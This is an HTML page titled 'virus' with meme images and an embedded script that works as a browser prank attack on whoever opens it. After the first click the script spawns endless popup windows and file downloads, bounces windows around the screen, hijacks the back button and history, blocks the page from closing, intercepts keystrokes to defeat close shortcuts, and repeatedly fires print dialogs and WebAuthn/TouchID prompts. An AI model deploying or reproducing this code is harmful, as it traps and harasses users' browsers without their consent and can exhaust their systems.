<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>virus</title>
		<meta property="og:type" content="website">
		<meta property="og:site_name" content="virus"/>
		<meta name="description" content="lmao haha funny virus maxxus is so cool"/>
		<meta property="og:url" content="https://maxxusx.github.io/virus"/>
		<style>
			html {
				font-size: 80px;
				text-align: center;
				cursor: none;
			}

			:root {
				font-size: 80px;
				text-align: center;
				cursor: none;
			}
		</style>
	</head>
	<body>
		<h1 id="haha">click to continue</h1>
		<img src="./things/robtop.png" alt="robtop">
		<video src="./things/nickeh.mov" autoplay loop controls></video>
		<img src="./things/subway surfers.gif" alt="maxxus is so cool">
		<img src="./things/atomicbomb.gif" alt="maxxus is so cool">
		<img src="./things/balls.jpeg" alt="maxxus is so cool">
		<img src="./things/checking key.gif" alt="maxxus is so cool">
		<img src="./things/cheese.gif" alt="maxxus is so cool">
		<img src="./things/dance.gif" alt="maxxus is so cool">
		<img src="./things/do not the cat.gif" alt="maxxus is so cool">
		<img src="./things/get real.gif" alt="maxxus is so cool">
		<img src="./things/heroin.gif" alt="maxxus is so cool">
		<img src="./things/his ass is NOT lifting.jpeg" alt="maxxus is so cool">
		<img src="./things/i am going insane.gif" alt="maxxus is so cool">
		<img src="./things/krnl-cracked.gif" alt="maxxus is so cool">
		<img src="./things/miguel.gif" alt="maxxus is so cool">
		<img src="./things/mind blown.gif" alt="maxxus is so cool">
		<img src="./things/money getting tight.jpeg" alt="maxxus is so cool">
		<img src="./things/portable.gif" alt="maxxus is so cool">
		<img src="./things/post this cat.gif" alt="maxxus is so cool">
		<img src="./things/roblox.gif" alt="maxxus is so cool">
		<img src="./things/roblox-mfs-me-like-roblox.gif" alt="maxxus is so cool">
		<img src="./things/stare.gif" alt="maxxus is so cool">
		<img src="./things/this delinquint died.jpeg" alt="maxxus is so cool">
		<img src="./things/too fat.gif" alt="maxxus is so cool">
		<img src="./things/will you him his order.jpeg" alt="maxxus is so cool">
		<img src="./things/wrd.gif" alt="maxxus is so cool">
		<img src="./things/yay.gif" alt="maxxus is so cool">
		<img src="./things/gyuyhuahuahrhgrhuifufrraujl.gif" alt="maxxus is so cool">
	</body>
	<script>
		const SCREEN_WIDTH = window.screen.availWidth
		const SCREEN_HEIGHT = window.screen.availHeight
		const VELOCITY = 50

		const wins = []

		/**
		* Returns true if the parent window is on the same origin. It's not enough to check
		* that `window.opener` is set, because that will also get set if a site on a
		* different origin links to theannoyingsite.com with `target='_blank'`.
		*/
		function isParentSameOrigin () {
			try {
				// May throw an exception if `window.opener` is on another origin
				return window.opener.location.origin === window.location.origin
				} catch (err) {
					return false
			}
		}

		const isChildWindow = (window.opener && isParentSameOrigin()) ||
		window.location.search.indexOf('child=true') !== -1

		/**
		* Is this window a parent window?
		*/
		const isParentWindow = !isChildWindow

		function moveWindowBounce() {
			let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
			let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

			setInterval(() => {
				const x = window.screenX
				const y = window.screenY
				const width = window.outerWidth
				const height = window.outerHeight

				if (x < 10) vx = Math.abs(vx)
				if (x + width > SCREEN_WIDTH - 10) vx = -1 * Math.abs(vx)
				if (y < 10 + 20) vy = Math.abs(vy)
				if (y + height > SCREEN_HEIGHT - 10) vy = -1 * Math.abs(vy)

				window.moveBy(vx, vy)
				window.moveBy(1, 1)
			}, 50)
		}

		function openWindow () {
			const { x, y } = getRandomCoords()
			const opts = `width=${480},height=${260},left=${x},top=${y}`
			const win = window.open(window.location.pathname, '', opts)
			
			// New windows may be blocked by the popup blocker
			if (!win) return
			wins.push(win)
		}

		function blockBackButton () {
			window.addEventListener('popstate', () => {
				window.history.forward()
			})
		}

		function focusWindows () {
			wins.forEach(win => {
				if (!win.closed) win.focus()
			})
		}

		function animateUrlWithEmojis() {
			if (window.ApplePaySession) {
				// Safari doesn't show the full URL anyway, so we can't animate it
				return
			}
			const rand = Math.random()
			if (rand < 0.33) {
				animateUrlWithBabies()
			} else if (rand < 0.67) {
				animateUrlWithWave()
			} else {
				animateUrlWithMoons()
			}

			function animateUrlWithBabies() {
				const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

				setInterval(() => {
					let s = ''
					let i;
					let m

					for (i = 0; i < 10; i++) {
						m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
						s += '👶' + e[m]
					}

					window.location.hash = s
				}, 100)
			}

			function animateUrlWithWave() {
				setInterval(() => {
					let i;
					let n;
					let s = ''

					for (i = 0; i < 10; i++) {
						n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

						s += String.fromCharCode(0x2581 + n)
					}

					window.location.hash = s
				}, 100)
			}

			function animateUrlWithMoons() {
				const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
				const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
				let m = 0

				setInterval(() => {
					let s = ''
					let x = 0

					if (!m) {
						while (d[x] === 4) {
							x++
						}

						if (x >= d.length) m = 1
						else {
							d[x]++
						}
					} else {
						while (d[x] === 0) {
							x++
						}

						if (x >= d.length) m = 0
						else {
							d[x]++

							if (d[x] === 8) d[x] = 0
						}
					}

					d.forEach(function(n) {
						s += f[n]
					})

					window.location.hash = s
				}, 100)
			}
		}

		function confirmPageUnload () {
			window.addEventListener('beforeunload', event => {
				speak('hey no leaving!')
				event.returnValue = true
			})
		}

		function fillHistory () {
			for (let i = 1; i < 20; i++) {
				window.history.pushState({}, '', window.location.pathname + '?q=' + i)
			}
			// Set location back to the initial location, so user does not notice
			window.history.pushState({}, '', window.location.pathname)
		}

		/**
		* Get random x, y coordinates for a new window on the screen. Takes into account
		* screen size, window size, and leaves a safe margin on all sides.
		*/
		function getRandomCoords () {
			const x = 10 +
			Math.floor(Math.random() * (SCREEN_WIDTH - 480 - 10))
			const y = 10 +
			Math.floor(Math.random() * (SCREEN_HEIGHT - 260 - 10))
			return { x, y }
		}

		/**
		* Request Webauthn attestation.
		* Requires user-initiated event.
		*/
		function requestWebauthnAttestation () {
			try {
			// From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
			// This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
		
			// sample arguments for registration
			const createCredentialDefaultArgs = {
				publicKey: {
				// Relying Party (a.k.a. - Service):
				rp: {
					name: 'Acme'
				},
		
				// User:
				user: {
					id: new Uint8Array(16),
					name: 'lolica@jaczup.me',
					displayName: 'Ptoszek Jaczupa'
				},
		
				pubKeyCredParams: [{
					type: 'public-key',
					alg: -7
				}],
		
				attestation: 'direct',
		
				timeout: 60000,
		
				challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
					0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
					0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
				]).buffer
				}
			}
		
			// sample arguments for login
			const getCredentialDefaultArgs = {
				publicKey: {
				timeout: 60000,
				// allowCredentials: [newCredential] // see below
				challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
					0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
					0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
				]).buffer
				}
			}
		
			// register / create a new credential
			navigator.credentials.create(createCredentialDefaultArgs)
				.then((cred) => {
				// normally the credential IDs available for an account would come from a server
				// but we can just copy them from above...
				const idList = [{
					id: cred.rawId,
					transports: ['usb', 'nfc', 'ble'],
					type: 'public-key'
				}]
				getCredentialDefaultArgs.publicKey.allowCredentials = idList
				return navigator.credentials.get(getCredentialDefaultArgs)
				})
			} catch {}
		}
		
		function downloadMaxxus() {
			fetch("./maxxus.png", { method: 'get', mode: 'no-cors', referrerPolicy: 'no-referrer' })
			.then(res => res.blob())
			.then(res => {
				const aElement = document.createElement('a');
				aElement.setAttribute('download', "maxxus.png");
				const href = URL.createObjectURL(res);
				aElement.href = href;
				aElement.setAttribute('target', '_blank');
				aElement.click();
				URL.revokeObjectURL(href);
			});
		}

		/**
		* When a child window closes, notify the parent window so it can remove it from
		* the list of child windows.
		*/
		function detectWindowClose() {
			window.addEventListener('unload', () => {
				if (!window.opener.closed) window.opener.onCloseWindow(window)
			})
		}
		
		/**
		* Handle a child window closing.
		*/
		function onCloseWindow(win) {
			const i = wins.indexOf(win)
			if (i >= 0) wins.splice(i, 1)
		}

		/**
		* Intercept all user-initiated events and call the given the function, `onInput`.
		*/
		function interceptUserInput (onInput) {
			document.body.addEventListener('touchstart', onInput, { passive: false })
		
			document.body.addEventListener('mousedown', onInput)
			document.body.addEventListener('mouseup', onInput)
			document.body.addEventListener('click', onInput)
		
			document.body.addEventListener('keydown', onInput)
			document.body.addEventListener('keyup', onInput)
			document.body.addEventListener('keypress', onInput)
		}

		function initChildWindow () {
			detectWindowClose()
			moveWindowBounce()
		}

		function initParentWindow () {
			blockBackButton()
			fillHistory()
		}

		function startChaos() {
			confirmPageUnload()
			animateUrlWithEmojis()

			interceptUserInput(event => {
				// Prevent default behavior (breaks closing window shortcuts)
				event.preventDefault()
				event.stopPropagation()

				focusWindows()

				setInterval(() => {
					downloadMaxxus()
					openWindow()
				}, 1)

				 // Capture key presses on the Command or Control keys, to interfere with the
				// "Close Window" shortcut.
				if (event.key === 'Meta' || event.key === 'Control') {
					window.print()
					requestWebauthnAttestation()
					window.print()
					requestWebauthnAttestation()
					window.print()
					requestWebauthnAttestation()
				} else {
					if (!window.ApplePaySession) {
						// Don't request TouchID on every interaction in Safari since it blocks
						// the event loop and stops windows from moving
						requestWebauthnAttestation()
					}
				}
			})
		}

		/*
		* Run this code in all windows, *both* child and parent windows.
		*/
		interceptUserInput(event => {
			document.getElementById("haha").innerText = "enjoy the virus nerd"
			startChaos()
		})

		/*
		* Use `window.opener` to detect if this window was opened by another window, which
		* will be its parent. The `window.opener` variable is a reference to the parent
		* window.
		*/
		if (isChildWindow) initChildWindow()
		else initParentWindow()
	</script>
</html>